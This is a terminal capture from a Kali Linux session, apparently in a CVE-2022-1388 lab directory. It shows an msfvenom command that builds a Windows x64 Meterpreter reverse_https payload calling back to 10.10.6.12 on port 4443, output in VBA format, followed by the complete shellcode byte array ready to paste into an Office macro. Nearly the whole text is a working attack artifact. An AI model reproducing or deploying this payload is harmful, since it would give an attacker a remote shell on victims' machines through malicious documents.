┌──(root㉿kali)-[/home/kali/codeplay/CVE-2022-1388]
└─# msfvenom -p windows/x64/meterpreter/reverse_https -a x64 LHOST=10.10.6.12 LPORT=4443 EXITFUNC=thread -f vbapplication   
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 797 bytes
Final size of vbapplication file: 2666 bytes
buf = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,82,72,49,210,101,72,139,82,96,72,139,82,24,81,72,139,82,32,86,77,49,201,72,15,183,74,74,72,139,114,80,72,49,192,172,60,97,124,2,44,32,65,193,201,13,65,1,193,226,237,82,65,81,72,139,82,32,139,66,60,72,1,208,102,129,120,24, _
11,2,15,133,114,0,0,0,139,128,136,0,0,0,72,133,192,116,103,72,1,208,68,139,64,32,80,73,1,208,139,72,24,227,86,77,49,201,72,255,201,65,139,52,136,72,1,214,72,49,192,65,193,201,13,172,65,1,193,56,224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1, _
208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,72,1,208,65,88,65,88,94,89,90,65,88,65,89,65,90,72,131,236,32,65,82,255,224,88,65,89,90,72,139,18,233,75,255,255,255,93,72,49,219,83,73,190,119,105,110,105,110,101,116,0,65,86,72,137,225,73,199,194,76,119,38,7, _
255,213,83,83,72,137,225,83,90,77,49,192,77,49,201,83,83,73,186,58,86,121,167,0,0,0,0,255,213,232,11,0,0,0,49,48,46,49,48,46,54,46,49,50,0,90,72,137,193,73,199,192,91,17,0,0,77,49,201,83,83,106,3,83,73,186,87,137,159,198,0,0,0,0,255,213,232,246,0,0, _
0,47,85,121,48,99,79,71,77,88,104,101,102,67,69,115,77,81,111,78,120,81,72,65,99,110,101,107,105,110,87,52,53,45,81,84,115,109,119,68,49,105,87,68,90,73,119,120,121,121,78,89,71,119,53,99,71,71,85,101,99,68,116,118,89,55,103,73,104,108,89,65,71,121,100,85,98,100,56,95, _
74,104,84,87,106,81,119,49,101,89,97,120,109,71,89,68,100,110,80,68,48,113,120,52,69,109,48,88,80,69,51,69,83,53,99,68,120,65,68,116,50,78,69,122,110,79,67,104,70,56,117,76,112,71,81,87,71,110,114,103,100,90,86,97,52,79,78,108,108,113,87,87,73,89,71,56,70,76,85,105, _
111,113,106,72,82,54,57,70,102,111,76,118,109,89,79,83,57,113,95,112,101,76,82,98,45,77,69,77,52,122,110,108,115,89,97,66,100,70,79,54,109,85,87,53,45,104,107,45,52,57,55,100,57,98,49,97,100,45,98,57,122,48,119,110,120,114,121,48,75,98,112,51,71,69,70,68,80,71,120,73, _
52,100,71,98,78,119,0,72,137,193,83,90,65,88,77,49,201,83,72,184,0,50,168,132,0,0,0,0,80,83,83,73,199,194,235,85,46,59,255,213,72,137,198,106,10,95,72,137,241,106,31,90,82,104,128,51,0,0,73,137,224,106,4,65,89,73,186,117,70,158,134,0,0,0,0,255,213,77,49,192, _
83,90,72,137,241,77,49,201,77,49,201,83,83,73,199,194,45,6,24,123,255,213,133,192,117,31,72,199,193,136,19,0,0,73,186,68,240,53,224,0,0,0,0,255,213,72,255,207,116,2,235,170,232,85,0,0,0,83,89,106,64,90,73,137,209,193,226,16,73,199,192,0,16,0,0,73,186,88,164,83, _
229,0,0,0,0,255,213,72,147,83,83,72,137,231,72,137,241,72,137,218,73,199,192,0,32,0,0,73,137,249,73,186,18,150,137,226,0,0,0,0,255,213,72,131,196,32,133,192,116,178,102,139,7,72,1,195,133,192,117,210,88,195,88,106,0,89,187,224,29,42,10,65,137,218,255,213)
